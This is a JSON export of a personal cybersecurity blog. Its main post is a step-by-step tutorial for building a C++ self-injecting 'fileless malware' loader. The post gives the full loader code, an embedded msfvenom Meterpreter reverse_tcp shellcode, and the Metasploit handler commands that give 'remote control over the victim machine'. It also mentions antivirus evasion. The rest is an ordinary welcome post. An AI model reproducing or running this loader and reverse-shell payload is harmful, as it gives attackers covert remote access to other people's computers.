
[{"content":"Ever heard of the word malware?\nIn simple terms, malware (short for malicious software) refers to any software intentionally designed to damage, disrupt, or gain unauthorized access to computers, servers, or entire networks. There are various forms of malwares such as Trojan horses, worms, spyware, and even ransomware like WannaCry or the more recent LockBit. Today, weâ€™re going to dive into the fundamentals by developing a basic self-injecting malware program using C++.\nTheory, bla-bla-bla\u0026hellip; # Why Choose C++? # Low-Level Capabilities: C++ being a low-level programming language provides direct access to system resources and memory. You\u0026rsquo;ll see, that\u0026rsquo;ll help later. Challenging to Reverse Engineer: C++ binaries are much harder to decompile and analyze compared to scripts in higher-level languages! :) Windows API Compatibility: That\u0026rsquo;ll grant us easy access to system functionalities for users running Windows (spoiler: Windows dominates the client OS market). Antivirus Evasion: We won\u0026rsquo;t cover this topic in this post, but still, it\u0026rsquo;s a great thing to keep in mind. C++ binaries will usually evade antiviruses more efficiently than python scripts wrapped into executables using tools like py-to-exe. Last but not least: It\u0026rsquo;s fast and efficient. What is a fileless malware? # You know what\u0026rsquo;s a malware now. But what about the fileless part? It\u0026rsquo;s the same goal, achieved with different means! A Fileless malware operates exclusively in the computer\u0026rsquo;s memory (RAM). It\u0026rsquo;s what we call a memory-based execution. It makes our malicious code harder to detect and stealthier.\nOur program (the malware we\u0026rsquo;ll code in a minute) will inject a shellcode written in machine code in the RAM and execute it. We call this technique self-injection because the shellcode is executed within the memory space of our own program. But do know that there are other techniques where a malware can inject and execute malicious code into the memory space of a different process. Don\u0026rsquo;t worry for the shellcode part as we will generate it using the wonderful tool msfvenom from the Metasploit framework!\nTo put it in a nutshell: Don\u0026rsquo;t worry if you don\u0026rsquo;t understand some steps, we\u0026rsquo;ll go into the details for each one of them.\nPrerequisites # What you\u0026rsquo;ll need in order to follow the steps of this guide is an x64 Windows machine, a compiler such as MinGW-w64 and the metasploit framework!\nThe Windows machine is going to be our target. MinGW-w64 will help us compile our code to run on Windows, and the metasploit framework will help us generating a shellcode to inject!\nApplication (message box) # First, create a .cpp file. I\u0026rsquo;ll call mine main.cpp.\nInclude the only two libraries we\u0026rsquo;ll need: Windows.h (for Windows API) and stdio.h. Your code should look something like this:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; int main(){ return 0; } Shellcode # Now we need to define an array for our shellcode. For the first test, I\u0026rsquo;ll just be using a simple messagebox saying Hello World. You can use it too!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; int main(){ unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x26\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x1b\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\u0026#34; \u0026#34;\\x21\\x00\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\x00\\x75\u0026#34; \u0026#34;\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; return 0; } Memory allocation # Next step ahead: committing and reserving some memory for our shellcode. To do so, we will use the VirtualAlloc function from Windows API. A quick dive into microsoft documentation and we find the informations we need:\nLPVOID VirtualAlloc( [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect ); LPVOID lpAddress: NULL in our case, we just want the system to do the job for us and find a free region. SIZE_T dwSize: sizeof(shellcode) ! :p DWORD flAllocationType: We need to set 2 flags. MEM_COMMIT to allocate physical storage in memory and MEM_RESERVE to reserve a range of the process\u0026rsquo;s virtual address space. We can combine these flags with the OR operator (|). DWORD flProtect: The best flag for our purpose is PAGE_EXECUTE_READWRITE, because we need the RWX permissions for the memory to be read from, written to and executed. The function returns an LPVOID, which is a pointer to the allocated memory region. We store this in the mem_alloc variable.\nHere is the line of code we need to add to our program:\n// Allocating, Committing and Reserving memory LPVOID mem_alloc = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); For debugging and analysis purposes, we should print the address of the memory we allocated.\nprintf(\u0026#34;Memory address: 0x%p\\n\u0026#34;, mem_alloc); Now, last step for this part, write the shellcode in memory.\nRtlCopyMemory(mem_alloc, shellcode, sizeof(shellcode)); (I let you google the documentation to understand the function, because you need to learn to RTFM :p)\nCreate our thread and execute the payload # Remember what I told you earlier? Our malicious code will be executed in a thread (a small and independent unit of a computer program). It\u0026rsquo;s like a mini-program within a larger program (called a process) that can run simultaneously with other threads. But don\u0026rsquo;t worry! We\u0026rsquo;ll only need one.\nFor this we use the CreateThread function from Windows API (yes, again).\nHANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId ); We will set default/NULL values for every argument, except the lpStartAddress.\n// Execute code stored in memory in a separate thread HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_alloc, NULL, 0, NULL); Last details # Bingo! Our code should already be working :)\nWell\u0026hellip; We still need to fix two or three things. First of all, we should tell our program to wait for the thread to be terminated before exiting. Then, we need to close the handle to our thread and free the memory we allocated!\n// Infinite loop until the program isn\u0026#39;t closed WaitForSingleObject(hThread, INFINITE); // Properly handle closing and memory releasing CloseHandle(hThread); VirtualFree(mem_alloc, 0, MEM_RELEASE); Perfect! Now, if you\u0026rsquo;ve followed all these steps, your code should look something like this:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; int main(){ unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x26\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x1b\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\u0026#34; \u0026#34;\\x21\\x00\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\x00\\x75\u0026#34; \u0026#34;\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // Allocating, Committing and Reserving memory LPVOID mem_alloc = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); printf(\u0026#34;Memory address: 0x%p\\n\u0026#34;, mem_alloc); // Write our shellcode in memory RtlCopyMemory(mem_alloc, shellcode, sizeof(shellcode)); // Execute code stored in memory in a separate thread HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_alloc, NULL, 0, NULL); // Infinite loop until the program isn\u0026#39;t closed WaitForSingleObject(hThread, INFINITE); // Properly handle closing and memory releasing CloseHandle(hThread); VirtualFree(mem_alloc, 0, MEM_RELEASE); return 0; } I compile the code with the command g++ main.cpp, execute the program and\u0026hellip; Tadaaaaa!! ðŸŽ‰ðŸŽ‰ðŸŽ‰\nApplication (metasploit payload) # Generating the shellcode # To generate our payload, we will run the following command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=\u0026lt;PORT\u0026gt; EXITFUNC=thread -f c\nwindows/x64/meterpreter/reverse_tcp: Our payload type. LHOST: The IP address of our command and control server. Attention, if your target is outside of your network, please use your public IPv4 address. LPORT: The port we will use to communicate with our victim. Again, if your target is external, forward your port and use on that is available (for instance 1234 or 4444). EXITFUNC=thread: Tells the shellcode to exit via a thread termination. It\u0026rsquo;s necessary to maintain the connection with our victim. -f c: Telling metasploit to give us a shellcode. Output:\n/opt/metasploit/config/application.rb:1: warning: /usr/lib/ruby/3.3.0/fiddle.rb was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.5.0. You can add fiddle to your Gemfile or gemspec to silence this warning. [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 511 bytes Final size of c file: 2179 bytes unsigned char buf[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x48\\x31\\xd2\\x56\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\u0026#34; \u0026#34;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\u0026#34; \u0026#34;\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\u0026#34; \u0026#34;\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x41\\x51\\x0f\u0026#34; \u0026#34;\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\u0026#34; \u0026#34;\\x74\\x67\\x48\\x01\\xd0\\x50\\x44\\x8b\\x40\\x20\\x8b\\x48\\x18\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\u0026#34; \u0026#34;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\x41\\xc1\\xc9\\x0d\\xac\\x41\\x01\\xc1\u0026#34; \u0026#34;\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\u0026#34; \u0026#34;\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\u0026#34; \u0026#34;\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\u0026#34; \u0026#34;\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\u0026#34; \u0026#34;\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\u0026#34; \u0026#34;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\u0026#34; \u0026#34;\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\u0026#34; \u0026#34;\\x89\\xe5\\x49\\xbc\\x02\\x00\\x04\\xd2\\xc0\\xa8\\x01\\x14\\x41\\x54\u0026#34; \u0026#34;\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\u0026#34; \u0026#34;\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\u0026#34; \u0026#34;\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\u0026#34; \u0026#34;\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\u0026#34; \u0026#34;\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\u0026#34; \u0026#34;\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\u0026#34; \u0026#34;\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\u0026#34; \u0026#34;\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\u0026#34; \u0026#34;\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\u0026#34; \u0026#34;\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\u0026#34; \u0026#34;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\u0026#34; \u0026#34;\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\u0026#34; \u0026#34;\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\u0026#34; \u0026#34;\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\u0026#34; \u0026#34;\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\u0026#34; \u0026#34;\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\xbb\\xe0\\x1d\u0026#34; \u0026#34;\\x2a\\x0a\\x41\\x89\\xda\\xff\\xd5\u0026#34;; Just copy the shellcode it generated for you (not mine obviously) and replace your previous variable value.\nCompile your code! g++ main.cpp\nSetup listener # Now we need to listen for incoming victim connections. For this, we\u0026rsquo;ll use the msfconsole. Run the command msfconsole.\nThen, type the following commands:\nuse exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST \u0026lt;IP\u0026gt; (0.0.0.0 if public) set LPORT \u0026lt;PORT\u0026gt; Now that we\u0026rsquo;ve configured our listener, we can run the last command: exploit! Then we just have to run the malware on our target.\nAnd\u0026hellip;\nWe have remote control over the victim machine :)\nCongratulations if you\u0026rsquo;ve made it to this step!\nThe End # I hope you\u0026rsquo;ve learned valuable skills and knowledge throughout this article. Don\u0026rsquo;t forget to check my other posts if you have the time!\nRemember, the program we built is very rudimentary and WILL be detected by modern antiviruses. Even Windows Defender, which is installed by default on modern Windows OS. That was just an introduction.\nKeep having fun, stay curious and hack the planet!!\n","date":"14 November 2024","externalUrl":null,"permalink":"/posts/self-injection/","section":"Posts","summary":"A hands-on guide to understanding and developing malware self-injection techniques.","title":"Introduction to Fileless Malware","type":"posts"},{"content":"","date":"14 November 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"14 November 2024","externalUrl":null,"permalink":"/","section":"Wipeey","summary":"","title":"Wipeey","type":"page"},{"content":"Hello, fellow cybersecurity enthusiasts and curious minds!\nWelcome to my blog, where I\u0026rsquo;ll be documenting my journey through the fascinating world of cybersecurity. As an IT student with a passion for computer security, I\u0026rsquo;m excited to share my experiences, learnings, and occasional musings with you all.\nWho Am I? # I\u0026rsquo;m a cybersecurity enthusiast on a mission to continuously improve and expand my knowledge across various domains. You\u0026rsquo;ll often find me honing my skills on platforms like TryHackMe and RootMe, always striving to push beyond my comfort zone and avoid the dreaded \u0026ldquo;tutorial hell.\u0026rdquo;\nWhat to Expect # This blog will be a melting pot of content, including:\nCTF Writeups: Detailed walkthroughs of challenges I\u0026rsquo;ve tackled, sharing both my successes and the valuable lessons learned from failures.\nCybersecurity Articles: In-depth explorations of various topics, from emerging threats to innovative defense strategies.\nCoding Adventures: As I continue to sharpen my skills, I\u0026rsquo;ll be sharing interesting projects and scripts I\u0026rsquo;m working on.\nTool Reviews: Insights into the cybersecurity tools I\u0026rsquo;m exploring (especially in OSINTðŸ”Ž).\nMy Digital Toolbox ðŸ§° # Currently, my arsenal includes:\nLanguages: C++, Java, Python Operating Systems: Linux, Windows Client/Server Databases: MySQL, NoSQL Scripting: Bash, VBS, Powershell Networking: Various tools and protocols I\u0026rsquo;m constantly adding to this list, so expect to see it grow as I progress! :p\nLooking Ahead # As I embark on this blogging journey, I\u0026rsquo;m looking forward to not just sharing my knowledge but also learning from you, dear reader! I hope this blog becomes a platform where we can exchange ideas, discuss the latest in cybersecurity, and grow together as a community. Stay tuned for upcoming posts, and don\u0026rsquo;t hesitate to reach out if you have any questions, suggestions, or just want to chat.\nHack the planet!!\n","date":"8 November 2024","externalUrl":null,"permalink":"/posts/presentation/","section":"Posts","summary":"A warm welcome to my corner of the internet! Join me as I share my CTF writeups, cybersecurity articles, and any other stuff that I\u0026rsquo;d like to share.","title":"Welcome to my blog!","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]